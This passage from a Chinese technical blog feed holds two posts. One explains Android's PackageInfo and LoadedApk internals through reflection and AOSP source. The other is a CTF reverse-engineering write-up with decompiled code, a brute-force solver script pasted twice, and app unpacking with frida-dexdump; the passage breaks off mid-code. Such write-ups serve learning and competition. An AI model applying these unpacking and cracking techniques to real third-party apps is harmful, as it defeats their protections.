<code>receivers</code></td><td>来自 manifest 中声明的四大组件</td></tr><tr><td><strong>权限声明</strong></td><td><code>requestedPermissions</code>, <code>requestedPermissionsFlags</code></td><td><code>&lt;uses-permission&gt;</code> 列表和系统授予状态</td></tr><tr><td><strong>签名信息</strong></td><td><code>signingInfo</code>（或旧版 <code>signatures</code>）</td><td>APK 签名证书、公钥哈希等</td></tr><tr><td><strong>共享信息</strong></td><td><code>sharedUserId</code>, <code>sharedUserLabel</code></td><td>多应用共享 UID 场景</td></tr><tr><td><strong>安装来源</strong></td><td><code>installLocation</code>, <code>installSourceInfo</code></td><td>安装路径、来源 App（如 Play Store）</td></tr><tr><td><strong>分包相关</strong></td><td><code>splitNames</code>, <code>splitCodePaths</code></td><td>Android 5.0+ 的多 APK 分割机制</td></tr></tbody></table><p>​这些字段都是从磁盘上安装包解析来的静态结构，不会随着应用运行而变化。</p><h4 id="LoadedApk"><a href="#LoadedApk" class="headerlink" title="LoadedApk"></a>LoadedApk</h4><p>​再来说说 <strong>LoadedApk</strong>。LoadedApk 是 Android 框架中的一个内部类（位于 android.app 包下），代表 <strong>一个已加载 APK 的运行时描述对象</strong>。</p><p>​它内部包含了</p><table><thead><tr><th>字段</th><th>含义</th></tr></thead><tbody><tr><td><code>ApplicationInfo mApplicationInfo</code></td><td>应用的信息（包名、路径、签名等）</td></tr><tr><td><code>ClassLoader mClassLoader</code></td><td>该应用的类加载器</td></tr><tr><td><code>Resources mResources</code></td><td>应用资源对象</td></tr><tr><td><code>Instrumentation mInstrumentation</code></td><td>应用的测试&#x2F;生命周期控制类</td></tr><tr><td><code>Application mApplication</code></td><td>当前应用对象</td></tr><tr><td><code>ActivityThread mActivityThread</code></td><td>所属的线程信息</td></tr></tbody></table><p>​这里面就包含了在加固时不可绕开的 <strong>ClassLoader</strong>。</p><p>​而 <strong>mPackageInfo</strong> 是 <strong>Context</strong> 内部的一个隐藏字段，这个字段对应的对象类型是 LoadedApk，所以是采取反射的方式来获取。在 demo 中还写了一种备用方案，就是如果无法直接从 ContextImpl 取出 mPackageInfo，就从<strong>全局</strong>的 ActivityThread 里去拿当前应用的 LoadedApk 对象。</p><p>​两种方案中又分别提到 mPackages 和 mPackageInfo，再说说这两。</p><table><thead><tr><th>字段</th><th>所属类</th><th>类型</th><th>含义</th></tr></thead><tbody><tr><td><code>mPackages</code></td><td><code>ActivityThread</code></td><td><code>ArrayMap&lt;String, WeakReference&lt;LoadedApk&gt;&gt;</code></td><td>全局缓存，保存<strong>所有已加载应用包</strong>（包括自身和插件）</td></tr><tr><td><code>mPackageInfo</code></td><td><code>ContextImpl</code></td><td><code>LoadedApk</code></td><td>当前 <code>Context</code>（通常是一个 Activity 或 Application）对应的<strong>单个应用包信息</strong></td></tr></tbody></table><ul><li><code>mPackages</code> 是 <strong>全局表</strong>（所有包的映射表）</li><li><code>mPackageInfo</code> 是 <strong>当前包的引用</strong>（指向上表中的一个值）</li></ul><p>​关系图（简化）</p><pre><code class="language-csharp">[ActivityThread]                &lt;-- 全局唯一    |    ├── mPackages : Map&lt;String, WeakReference&lt;LoadedApk&gt;&gt;    |        ├── &quot;com.example.app&quot; ──────▶ LoadedApk #1    |        ├── &quot;plugin.apk&quot; ───────────▶ LoadedApk #2    |        └── &quot;systemui&quot; ─────────────▶ LoadedApk #3    |[ContextImpl]                    &lt;-- 每个 Activity/Service/Application 都有一个    └── mPackageInfo ─────────────▶ LoadedApk #1   ←（指向上面的其中一个）</code></pre><p>用法区别</p><table><thead><tr><th>场景</th><th>通常使用哪个</th><th>原因</th></tr></thead><tbody><tr><td>获取当前应用的 ClassLoader &#x2F; Resources</td><td><code>mPackageInfo</code></td><td>它直接指向当前包的 <code>LoadedApk</code></td></tr><tr><td>获取其他包（如插件）的 LoadedApk</td><td><code>mPackages</code></td><td>它存着所有包的映射关系</td></tr><tr><td>框架初始化时查找 Application 对象</td><td><code>mPackages</code></td><td>因为所有应用包都在这里注册</td></tr><tr><td>Activity 启动时内部访问资源</td><td><code>mPackageInfo</code></td><td>每个 ContextImpl 都绑定自己的 LoadedApk</td></tr></tbody></table><p>​</p><p>​那么这两者之间是怎么“沟通”的呢？答：ApplicationInfo。</p><p>ApplicationInfo 提供路径、UID等信息，安装时生成，运行时被拷贝使用，可同时出现在 PackageInfo 和 LoadedApk  中。</p><h3 id="三、源码分析"><a href="#三、源码分析" class="headerlink" title="三、源码分析"></a>三、源码分析</h3><h4 id="PackageManager"><a href="#PackageManager" class="headerlink" title="PackageManager"></a>PackageManager</h4><p>​首先就从最开始的 getPackageManager() 开始分析，当我们在 Android studio 中跟进时，会发现，已经看不到有效代码了</p><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20251011101749709.png" alt="image-20251011101749709"></p><p>​但是至少知道是在 ContextWrapper.class，去到源码中进行跟进</p><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20251011101855497.png" alt="image-20251011101855497"></p><p>​继续跟进</p><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20251011101959824.png" alt="image-20251011101959824"></p><pre><code class="language-Java">@Overridepublic PackageManager getPackageManager() &#123;    if (mPackageManager != null) &#123;        return mPackageManager;    &#125;    final IPackageManager pm = ActivityThread.getPackageManager();    if (pm != null) &#123;        // Doesn&#39;t matter if we make more than one instance.        return (mPackageManager = new ApplicationPackageManager(this, pm));    &#125;    return null;&#125;</code></pre><p>​这段代码首先先尝试返回缓存的 <strong>mPackageManager</strong>，若没有就从 <strong>ActivityThread</strong>（应用进程的线程调度入口）拿到系统的 <strong>IPackageManager</strong>（是一个 AIDL 接口的 Binder代理，它实际代表系统进程里的 PackageManagerService），用它创建一个 <strong>ApplicationPackageManager</strong> 并缓存后返回。</p><p>​如下是 ChatGPT 给出的流程图</p><pre><code class="language-scss">┌──────────────────────────────────────────────┐│                  App 进程                    ││──────────────────────────────────────────────││                                              ││  Activity / ContextImpl                      ││       │                                       ││       │ getPackageManager()                   ││       ▼                                       ││  ApplicationPackageManager (extends PackageManager)│       │  ← 持有 IPackageManager 接口引用 (mPM)│       ││       │ 调用 mPM.getPackageInfo()│       ▼│  IPackageManager.Stub.Proxy （AIDL 客户端代理）│       │  ↓ Binder 调用（跨进程）             │══════════════════════════════════════════════││                 Binder 驱动层                 ││══════════════════════════════════════════════││       ↑  Binder 通信（内核级）               ││       │                                       │└───────┼───────────────────────────────────────┘        │        ▼┌──────────────────────────────────────────────┐│              system_server 进程              ││──────────────────────────────────────────────││                                              ││  PackageManagerService (extends IPackageManager.Stub)│       ││       │ 真正实现 getPackageInfo() 等方法│       │ 负责解析 APK、缓存包信息、检查权限│       ││       ▼│  返回结果 → Binder 驱动 → 回传给 App 进程│                                              ││  注册时：                                    ││     ServiceManager.addService(&quot;package&quot;, pm);││                                              │└──────────────────────────────────────────────┘</code></pre><p>​而  ActivityThread.getPackageManager() 方法继续跟进分析下去个人感觉意义不大了，因为这次笔者的学习目的就是理解 PackageManager 是怎么管理应用包、提供查询接口的，再往后已经不负责逻辑处理、也不解析包信息，只是一次 Binder 代理对象的获取。</p><p>​在通过 <strong>getPackageManager()</strong> 方法拿到 pm 对象之后，后续调用 <strong>getPackageInfo()</strong> 方法时，虽然是调用本地方法，但实际上是一个跨进程调用。</p><h4 id="LoadedApk-1"><a href="#LoadedApk-1" class="headerlink" title="LoadedApk"></a>LoadedApk</h4><p>​因为 loadedApk 是通过反射得到的，所以也就没什么逻辑好分析的，但是我们可以去看看源码中这些字段的定义。</p><p>​首先分析的是 <strong>mPackageInfo</strong> 字段，在路径 <strong>frameworks&#x2F;base&#x2F;core&#x2F;java&#x2F;android&#x2F;app&#x2F;ContextImpl.java</strong> 可以找到该字段的定义。</p><pre><code class="language-Java">final @NonNull LoadedApk mPackageInfo;</code></pre><p>​可以看到 mPackageInfo 是 <strong>android.app.LoadedApk</strong> 类型。<code>LoadedApk</code> 是一个非常核心的类，代表<strong>当前应用包在内存中的加载信息</strong>（即这个 APK 在当前进程中的运行时封装）。</p><p>​ContextImpl 与 LoadedApk 的关系如下</p><table><thead><tr><th>类名</th><th>作用</th><th>与 mPackageInfo 关系</th></tr></thead><tbody><tr><td><code>ContextImpl</code></td><td>Context 的真正实现类</td><td>持有一个 <code>mPackageInfo</code></td></tr><tr><td><code>LoadedApk</code></td><td>封装了当前 APK 的资源、ClassLoader、Application 信息</td><td>被 <code>ContextImpl</code> 引用</td></tr></tbody></table><p>​然后再跟进 LoadedApk.java。代码量很大，这里就不贴出来了，想仔细研究的直接找 frameworks&#x2F;base&#x2F;core&#x2F;java&#x2F;android&#x2F;app&#x2F;LoadedApk.java 路径。</p><p>​通过源码进一步确认了 loadedApk 对象是一个 APK 在内存中的完整加载状态，通俗来说即这个类是 Android 应用在进程中的运行时快照。</p><p>​再看 demo 里的逻辑，就更清晰了<br><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20251011114625817.png" alt="image-20251011114625817"></p><p>​在拿到 loadedApk 对象之后，通过反射获取 LoadedApk 类，接着遍历所有字段，然后打印。</p><p>​这是第一种获取 loadedApk 对象的方法，再看看另外一种。</p><p>​首先在 Android AOSP 源码中找到</p><pre><code>frameworks/base/core/java/android/app/ActivityThread.java</code></pre><p>​然后找 mPackages 字段的定义</p><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20251011115201100.png" alt="image-20251011115201100"></p><pre><code class="language-Java">final ArrayMap&lt;String, WeakReference&lt;LoadedApk&gt;&gt; mPackages = new ArrayMap&lt;&gt;();</code></pre><p>​这是一个全局缓存，保存了当前进程内所有已加载的 APK 包。</p><ul><li>key：包名（String）</li><li>value：指向 LoadedApk 的 WeakReference</li></ul><p>​再看看和该字段有关的方法。</p><pre><code class="language-Java">@UnsupportedAppUsagepublic final LoadedApk getPackageInfoNoCheck(ApplicationInfo ai,        CompatibilityInfo compatInfo) &#123;    return getPackageInfo(ai, compatInfo, null, false, true, false);&#125;</code></pre><p>​ActivityThread 会通过它从 mPackages 获取或创建 LoadedApk，继续跟进，就可以看到</p><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20251011115802492.png" alt="image-20251011115802492">完整代码如下</p><pre><code class="language-Java">private LoadedApk getPackageInfo(ApplicationInfo aInfo, CompatibilityInfo compatInfo,            ClassLoader baseLoader, boolean securityViolation, boolean includeCode,            boolean registerPackage, boolean isSdkSandbox) &#123;        final boolean differentUser = (UserHandle.myUserId() != UserHandle.getUserId(aInfo.uid));        synchronized (mResourcesManager) &#123;            WeakReference&lt;LoadedApk&gt; ref;            if (differentUser || isSdkSandbox) &#123;                // Caching not supported across users and for sdk sandboxes                ref = null;            &#125; else if (includeCode) &#123;                ref = mPackages.get(aInfo.packageName);            &#125; else &#123;                ref = mResourcePackages.get(aInfo.packageName);            &#125;            LoadedApk packageInfo = ref != null ? ref.get() : null;            if (packageInfo != null) &#123;                if (!isLoadedApkResourceDirsUpToDate(packageInfo, aInfo)) &#123;                    if (packageInfo.getApplicationInfo().createTimestamp &gt; aInfo.createTimestamp) &#123;                        // The cached loaded apk is newer than the one passed in, we should not                        // update the cached version                        Slog.w(TAG, &quot;getPackageInfo() called with an older ApplicationInfo &quot;                                + &quot;than the cached version for package &quot; + aInfo.packageName);                    &#125; else &#123;                        Slog.v(TAG, &quot;getPackageInfo() caused update to cached ApplicationInfo &quot;                                + &quot;for package &quot; + aInfo.packageName);                        List&lt;String&gt; oldPaths = new ArrayList&lt;&gt;();                        LoadedApk.makePaths(this, aInfo, oldPaths);                        packageInfo.updateApplicationInfo(aInfo, oldPaths);                    &#125;                &#125;                return packageInfo;            &#125;            if (localLOGV) &#123;                Slog.v(TAG, (includeCode ? &quot;Loading code package &quot;                        : &quot;Loading resource-only package &quot;) + aInfo.packageName                        + &quot; (in &quot; + (mBoundApplication != null                        ? mBoundApplication.processName : null)                        + &quot;)&quot;);            &#125;            packageInfo =                    new LoadedApk(this, aInfo, compatInfo, baseLoader,                            securityViolation, includeCode                            &amp;&amp; (aInfo.flags &amp; ApplicationInfo.FLAG_HAS_CODE) != 0, registerPackage);            if (mSystemThread &amp;&amp; &quot;android&quot;.equals(aInfo.packageName)) &#123;                packageInfo.installSystemApplicationInfo(aInfo,                        getSystemContext().mPackageInfo.getClassLoader());            &#125;            if (differentUser || isSdkSandbox) &#123;                // Caching not supported across users and for sdk sandboxes            &#125; else if (includeCode) &#123;                mPackages.put(aInfo.packageName,                        new WeakReference&lt;LoadedApk&gt;(packageInfo));            &#125; else &#123;                mResourcePackages.put(aInfo.packageName,                        new WeakReference&lt;LoadedApk&gt;(packageInfo));            &#125;            return packageInfo;        &#125;    &#125;</code></pre><p>​再看 dmeo 中的代码逻辑</p><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20251011141239807.png" alt="image-20251011141239807"></p><p>​packages 变量指向了当前进程中 ActivityThread 维护的全局 Map，它保存了当前进程里所有已加载的 APK 包信息（LoadedApk 对象）。然后再根据包名从变量 packages 取出对应的 LoadedApk 引用。</p><p>​为什么是 WeakReference？mPackages 里保存的不是直接的 LoadedApk 对象，而是 <code>WeakReference&lt;LoadedApk&gt;</code>。这是因为系统为了避免内存泄漏：</p><ul><li>当某个 APK 不再引用（比如插件卸载或分进程退出）</li><li>GC（垃圾回收器）可以自动回收对应的 LoadedApk 实例。</li></ul><p>所以这里是弱引用。</p><h3 id="四、最后"><a href="#四、最后" class="headerlink" title="四、最后"></a>四、最后</h3><p>​经过以上的梳理，对 PackageInfo 和 LoadedApk 有了较为清晰的理解。</p>]]></content>
      
      
      <categories>
          
          <category> Android学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Android </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2025年湾区杯网络安全大赛初赛</title>
      <link href="/2025/09/09/2025%E5%B9%B4%E6%B9%BE%E5%8C%BA%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B%E5%88%9D%E8%B5%9B/"/>
      <url>/2025/09/09/2025%E5%B9%B4%E6%B9%BE%E5%8C%BA%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B%E5%88%9D%E8%B5%9B/</url>
      
        <content type="html"><![CDATA[<h1 id="2025年湾区杯网络安全大赛初赛"><a href="#2025年湾区杯网络安全大赛初赛" class="headerlink" title="2025年湾区杯网络安全大赛初赛"></a>2025年湾区杯网络安全大赛初赛</h1><h3 id="hardtest"><a href="#hardtest" class="headerlink" title="hardtest"></a>hardtest</h3><p>IDA 打开反编译，逻辑很清晰，就是两块加密，第一个输入一个伪随机数没什么用</p><pre><code class="language-c">__int64 __fastcall main(int a1, char **a2, char **a3)&#123;  unsigned int seed; // eax  unsigned __int64 v5; // rax  void *v6; // rsp  unsigned __int64 v7; // rax  void *v8; // rsp  __int64 encFlag1[4]; // [rsp+8h] [rbp-F0h] BYREF  char v10; // [rsp+29h] [rbp-CFh] BYREF  char v11; // [rsp+2Ah] [rbp-CEh]  char v12; // [rsp+2Bh] [rbp-CDh]  int j; // [rsp+2Ch] [rbp-CCh]  int i; // [rsp+30h] [rbp-C8h]  int flag_len; // [rsp+34h] [rbp-C4h]  __int64 v16; // [rsp+38h] [rbp-C0h]  __int64 *p_encFlag1; // [rsp+40h] [rbp-B8h]  __int64 v18; // [rsp+48h] [rbp-B0h]  __int64 *p_encFlag1_1; // [rsp+50h] [rbp-A8h]  char flag[104]; // [rsp+58h] [rbp-A0h] BYREF  unsigned __int64 v21; // [rsp+C0h] [rbp-38h]  v21 = __readfsqword(0x28u);  setbuf(stdin, 0LL);  setbuf(stdout, 0LL);  setbuf(stderr, 0LL);  seed = time(0LL);  srand(seed);  v12 = rand() % 255 + 1;  printf(&quot;input your number(1-255): &quot;);  if ( __isoc99_scanf(&quot;%d&quot;, &amp;v10) == 1 &amp;&amp; v12 == v10 )  &#123;    while ( getchar() != 10 )      ;    printf(&quot;flag: &quot;);    fgets(flag, 100, stdin);    flag[strcspn(flag, &quot;\n&quot;)] = 0;    flag_len = strlen(flag);    v16 = flag_len - 1LL;    encFlag1[2] = flag_len;    encFlag1[3] = 0LL;    encFlag1[0] = flag_len;    encFlag1[1] = 0LL;    v5 = 16 * ((flag_len + 15LL) / 0x10uLL);    while ( encFlag1 != (encFlag1 - (v5 &amp; 0xFFFFFFFFFFFFF000LL)) )      ;    v6 = alloca(v5 &amp; 0xFFF);    if ( (v5 &amp; 0xFFF) != 0 )      *(&amp;encFlag1[-1] + (v5 &amp; 0xFFF)) = *(&amp;encFlag1[-1] + (v5 &amp; 0xFFF));    p_encFlag1 = encFlag1;    crypto1(flag, encFlag1);    v18 = flag_len - 1LL;    v7 = 16 * ((flag_len + 15LL) / 0x10uLL);    while ( encFlag1 != (encFlag1 - (v7 &amp; 0xFFFFFFFFFFFFF000LL)) )      ;    v8 = alloca(v7 &amp; 0xFFF);    if ( (v7 &amp; 0xFFF) != 0 )      *(&amp;encFlag1[-1] + (v7 &amp; 0xFFF)) = *(&amp;encFlag1[-1] + (v7 &amp; 0xFFF));    p_encFlag1_1 = encFlag1;    for ( i = 0; i &lt; flag_len; ++i )      *(p_encFlag1_1 + i) = crypto2(*(p_encFlag1 + i));    v11 = 1;    for ( j = 0; j &lt; flag_len; ++j )    &#123;      if ( *(p_encFlag1_1 + j) != enc[j] )      &#123;        v11 = 0;        break;      &#125;    &#125;    if ( v11 )      puts(&quot;right&quot;);    return 0LL;  &#125;  else  &#123;    puts(&quot;error&quot;);    return 1LL;  &#125;&#125;</code></pre><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250908110301375.png" alt="image-20250908110301375"></p><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250908110312387.png" alt="image-20250908110312387"></p><p>直接抄下来，跑破就完事了</p><p>exp 如下</p><pre><code class="language-python"># Encrypted data from address 0x2120encrypted_data = [    0x97, 0xd5, 0x60, 0x43, 0xb4, 0x10, 0x43, 0x73, 0x0f, 0xda, 0x43, 0xcd,    0xd3, 0xe8, 0x73, 0x4a, 0x94, 0xc3, 0xcd, 0x71, 0xbd, 0xdc, 0x97, 0x1a]Sbox = [0x63, 0x7C, 0x77, 0x7B, 0xF2, 0x6B, 0x6F, 0xC5, 0x30, 0x01,  0x67, 0x2B, 0xFE, 0xD7, 0xAB, 0x76, 0xCA, 0x82, 0xC9, 0x7D,  0xFA, 0x59, 0x47, 0xF0, 0xAD, 0xD4, 0xA2, 0xAF, 0x9C, 0xA4,  0x72, 0xC0, 0xB7, 0xFD, 0x93, 0x26, 0x36, 0x3F, 0xF7, 0xCC,  0x34, 0xA5, 0xE5, 0xF1, 0x71, 0xD8, 0x31, 0x15, 0x04, 0xC7,  0x23, 0xC3, 0x18, 0x96, 0x05, 0x9A, 0x07, 0x12, 0x80, 0xE2,  0xEB, 0x27, 0xB2, 0x75, 0x09, 0x83, 0x2C, 0x1A, 0x1B, 0x6E,  0x5A, 0xA0, 0x52, 0x3B, 0xD6, 0xB3, 0x29, 0xE3, 0x2F, 0x84,  0x53, 0xD1, 0x00, 0xED, 0x20, 0xFC, 0xB1, 0x5B, 0x6A, 0xCB,  0xBE, 0x39, 0x4A, 0x4C, 0x58, 0xCF, 0xD0, 0xEF, 0xAA, 0xFB,  0x43, 0x4D, 0x33, 0x85, 0x45, 0xF9, 0x02, 0x7F, 0x50, 0x3C,  0x9F, 0xA8, 0x51, 0xA3, 0x40, 0x8F, 0x92, 0x9D, 0x38, 0xF5,  0xBC, 0xB6, 0xDA, 0x21, 0x10, 0xFF, 0xF3, 0xD2, 0xCD, 0x0C,  0x13, 0xEC, 0x5F, 0x97, 0x44, 0x17, 0xC4, 0xA7, 0x7E, 0x3D,  0x64, 0x5D, 0x19, 0x73, 0x60, 0x81, 0x4F, 0xDC, 0x22, 0x2A,  0x90, 0x88, 0x46, 0xEE, 0xB8, 0x14, 0xDE, 0x5E, 0x0B, 0xDB,  0xE0, 0x32, 0x3A, 0x0A, 0x49, 0x06, 0x24, 0x5C, 0xC2, 0xD3,  0xAC, 0x62, 0x91, 0x95, 0xE4, 0x79, 0xE7, 0xC8, 0x37, 0x6D,  0x8D, 0xD5, 0x4E, 0xA9, 0x6C, 0x56, 0xF4, 0xEA, 0x65, 0x7A,  0xAE, 0x08, 0xBA, 0x78, 0x25, 0x2E, 0x1C, 0xA6, 0xB4, 0xC6,  0xE8, 0xDD, 0x74, 0x1F, 0x4B, 0xBD, 0x8B, 0x8A, 0x70, 0x3E,  0xB5, 0x66, 0x48, 0x03, 0xF6, 0x0E, 0x61, 0x35, 0x57, 0xB9,  0x86, 0xC1, 0x1D, 0x9E, 0xE1, 0xF8, 0x98, 0x11, 0x69, 0xD9,  0x8E, 0x94, 0x9B, 0x1E, 0x87, 0xE9, 0xCE, 0x55, 0x28, 0xDF,  0x8C, 0xA1, 0x89, 0x0D, 0xBF, 0xE6, 0x42, 0x68, 0x41, 0x99,  0x2D, 0x0F, 0xB0, 0x54, 0xBB, 0x16]def rotate_left(value, shift):    return ((value &lt;&lt; shift) | (value &gt;&gt; (8 - shift))) &amp; 0xFFdef rotate_right(value, shift):    return ((value &gt;&gt; shift) | (value &lt;&lt; (8 - shift))) &amp; 0xFFdef sub_1313(v4):    index = 255    v2 = 1    while index:        if (index &amp; 1) != 0:            v2 = v4 * v2 % 257        v4 = v4 * v4 % 257        index &gt;&gt;= 1    return v2enc1 = [0] * len(encrypted_data)for i in range(len(encrypted_data)):    for char in range(32, 128):        temp = char        enc1[i] = rotate_left(char, (i % 7) + 1)        v1 = rotate_left(enc1[i] ^ 0x5A, 3)        v3 = sub_1313((16 * ((3 * (v1 &gt;&gt; 4)) &amp; 0xF)) | (5 * (v1 &amp; 0xF)) &amp; 0xF)        if encrypted_data[i] == Sbox[rotate_right(v3, 2)]:            print(chr(temp), end=&quot;&quot;)            break# Encrypted data from address 0x2120encrypted_data = [    0x97, 0xd5, 0x60, 0x43, 0xb4, 0x10, 0x43, 0x73, 0x0f, 0xda, 0x43, 0xcd,    0xd3, 0xe8, 0x73, 0x4a, 0x94, 0xc3, 0xcd, 0x71, 0xbd, 0xdc, 0x97, 0x1a]Sbox = [0x63, 0x7C, 0x77, 0x7B, 0xF2, 0x6B, 0x6F, 0xC5, 0x30, 0x01,  0x67, 0x2B, 0xFE, 0xD7, 0xAB, 0x76, 0xCA, 0x82, 0xC9, 0x7D,  0xFA, 0x59, 0x47, 0xF0, 0xAD, 0xD4, 0xA2, 0xAF, 0x9C, 0xA4,  0x72, 0xC0, 0xB7, 0xFD, 0x93, 0x26, 0x36, 0x3F, 0xF7, 0xCC,  0x34, 0xA5, 0xE5, 0xF1, 0x71, 0xD8, 0x31, 0x15, 0x04, 0xC7,  0x23, 0xC3, 0x18, 0x96, 0x05, 0x9A, 0x07, 0x12, 0x80, 0xE2,  0xEB, 0x27, 0xB2, 0x75, 0x09, 0x83, 0x2C, 0x1A, 0x1B, 0x6E,  0x5A, 0xA0, 0x52, 0x3B, 0xD6, 0xB3, 0x29, 0xE3, 0x2F, 0x84,  0x53, 0xD1, 0x00, 0xED, 0x20, 0xFC, 0xB1, 0x5B, 0x6A, 0xCB,  0xBE, 0x39, 0x4A, 0x4C, 0x58, 0xCF, 0xD0, 0xEF, 0xAA, 0xFB,  0x43, 0x4D, 0x33, 0x85, 0x45, 0xF9, 0x02, 0x7F, 0x50, 0x3C,  0x9F, 0xA8, 0x51, 0xA3, 0x40, 0x8F, 0x92, 0x9D, 0x38, 0xF5,  0xBC, 0xB6, 0xDA, 0x21, 0x10, 0xFF, 0xF3, 0xD2, 0xCD, 0x0C,  0x13, 0xEC, 0x5F, 0x97, 0x44, 0x17, 0xC4, 0xA7, 0x7E, 0x3D,  0x64, 0x5D, 0x19, 0x73, 0x60, 0x81, 0x4F, 0xDC, 0x22, 0x2A,  0x90, 0x88, 0x46, 0xEE, 0xB8, 0x14, 0xDE, 0x5E, 0x0B, 0xDB,  0xE0, 0x32, 0x3A, 0x0A, 0x49, 0x06, 0x24, 0x5C, 0xC2, 0xD3,  0xAC, 0x62, 0x91, 0x95, 0xE4, 0x79, 0xE7, 0xC8, 0x37, 0x6D,  0x8D, 0xD5, 0x4E, 0xA9, 0x6C, 0x56, 0xF4, 0xEA, 0x65, 0x7A,  0xAE, 0x08, 0xBA, 0x78, 0x25, 0x2E, 0x1C, 0xA6, 0xB4, 0xC6,  0xE8, 0xDD, 0x74, 0x1F, 0x4B, 0xBD, 0x8B, 0x8A, 0x70, 0x3E,  0xB5, 0x66, 0x48, 0x03, 0xF6, 0x0E, 0x61, 0x35, 0x57, 0xB9,  0x86, 0xC1, 0x1D, 0x9E, 0xE1, 0xF8, 0x98, 0x11, 0x69, 0xD9,  0x8E, 0x94, 0x9B, 0x1E, 0x87, 0xE9, 0xCE, 0x55, 0x28, 0xDF,  0x8C, 0xA1, 0x89, 0x0D, 0xBF, 0xE6, 0x42, 0x68, 0x41, 0x99,  0x2D, 0x0F, 0xB0, 0x54, 0xBB, 0x16]def rotate_left(value, shift):    return ((value &lt;&lt; shift) | (value &gt;&gt; (8 - shift))) &amp; 0xFFdef rotate_right(value, shift):    return ((value &gt;&gt; shift) | (value &lt;&lt; (8 - shift))) &amp; 0xFFdef sub_1313(v4):    index = 255    v2 = 1    while index:        if (index &amp; 1) != 0:            v2 = v4 * v2 % 257        v4 = v4 * v4 % 257        index &gt;&gt;= 1    return v2enc1 = [0] * len(encrypted_data)for i in range(len(encrypted_data)):    for char in range(32, 128):        temp = char        enc1[i] = rotate_left(char, (i % 7) + 1)        v1 = rotate_left(enc1[i] ^ 0x5A, 3)        v3 = sub_1313((16 * ((3 * (v1 &gt;&gt; 4)) &amp; 0xF)) | (5 * (v1 &amp; 0xF)) &amp; 0xF)        if encrypted_data[i] == Sbox[rotate_right(v3, 2)]:            print(chr(temp), end=&quot;&quot;)            break</code></pre><p>flag{Bl@st1ng_1s_a_g00d_Way!!}</p><h3 id="strangeApp"><a href="#strangeApp" class="headerlink" title="strangeApp"></a>strangeApp</h3><p>有点唐的，app 运行不起来，后来在公司试了不少测试机，并且还得插卡，Java 层有检测，然后跑起来，<br><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250908134916238.png" alt="image-20250908134916238"></p><p>并用 frida-dexdump 脱壳，<br><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250908135016759.png" alt="image-20250908135016759"></p><p>第一个就是关键的 dex 文件，JADX 打开，如果报 checksum 有问题，那么就在首选项把下面这个选项关掉，或者写个脚本修复一下<br><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250908135119346.png" alt="image-20250908135119346"></p><p>关掉之后，就可以正常打开了</p><pre><code class="language-Java">package com.swdd.strangeapp;import android.content.DialogInterface;import android.os.Bundle;import android.view.View;import android.widget.Button;import android.widget.EditText;import androidx.appcompat.app.AlertDialog;import androidx.appcompat.app.AppCompatActivity;import java.nio.charset.StandardCharsets;import java.security.Key;import javax.crypto.Cipher;import javax.crypto.spec.IvParameterSpec;import javax.crypto.spec.SecretKeySpec;/* loaded from: C:\Users\16219\Desktop\strangeapp\classes.dex */public class MainActivity extends AppCompatActivity &#123;    private static final byte[] TARGET = &#123;118, 17, 7, 124, -99, 51, 23, -123, -78, 23, -53, 1, 42, 109, -77, 5, -87, 10, -77, 106, 78, 100, 123, -118, -47, 31, 19, 56, 115, -105, -11, -38, -18, -72, 12, 42, 17, 55, -121, -44, 119, -41, 87, 118, 95, -76, -84, 69&#125;;    public static String a(String algo) &#123;        if (algo == null || algo.isEmpty()) &#123;            return algo;        &#125;        char first = algo.charAt(0);        char changed = (char) (first ^ 5);        return changed + algo.substring(1);    &#125;    @Override // androidx.fragment.app.FragmentActivity, androidx.activity.ComponentActivity, androidx.core.app.ComponentActivity, android.app.Activity    protected void onCreate(Bundle savedInstanceState) &#123;        super.onCreate(savedInstanceState);        setContentView(R.layout.activity_main);        final EditText flag = (EditText) findViewById(R.id.inputText);        Button checkButton = (Button) findViewById(R.id.checkButton);        checkButton.setOnClickListener(new View.OnClickListener() &#123; // from class: com.swdd.strangeapp.MainActivity$$ExternalSyntheticLambda0            @Override // android.view.View.OnClickListener            public final void onClick(View view) &#123;                this.f$0.m160lambda$onCreate$0$comswddstrangeappMainActivity(flag, view);            &#125;        &#125;);    &#125;    /* renamed from: lambda$onCreate$0$com-swdd-strangeapp-MainActivity */    /* synthetic */ void m160lambda$onCreate$0$comswddstrangeappMainActivity(EditText inputText, View v) &#123;        String input = inputText.getText().toString();        try &#123;            byte[] encrypted = aa(input);            if (compareBytes(encrypted, TARGET)) &#123;                showDialog(&quot;Good&quot;);            &#125; else &#123;                showDialog(&quot;NO&quot;);            &#125;        &#125; catch (Exception e) &#123;            showDialog(&quot;加密失败: &quot; + e.getMessage());        &#125;    &#125;    private byte[] aa(String input) throws Exception &#123;        Key secretKey = new SecretKeySpec(&quot;1234567891123456&quot;.getBytes(StandardCharsets.UTF_8), a(&quot;DES&quot;));        IvParameterSpec iv = new IvParameterSpec(&quot;1234567891123456&quot;.getBytes(StandardCharsets.UTF_8));        Cipher cipher = Cipher.getInstance(a(&quot;DES/CBC/PKCS5Padding&quot;));        cipher.init(1, secretKey, iv);        return cipher.doFinal(input.getBytes(StandardCharsets.UTF_8));    &#125;    private boolean compareBytes(byte[] a, byte[] b) &#123;        if (a == null || b == null || a.length != b.length) &#123;            return false;        &#125;        for (int i = 0; i &lt; a.length; i++) &#123;            if (a[i] != b[i]) &#123;                return false;            &#125;        &#125;        return true; 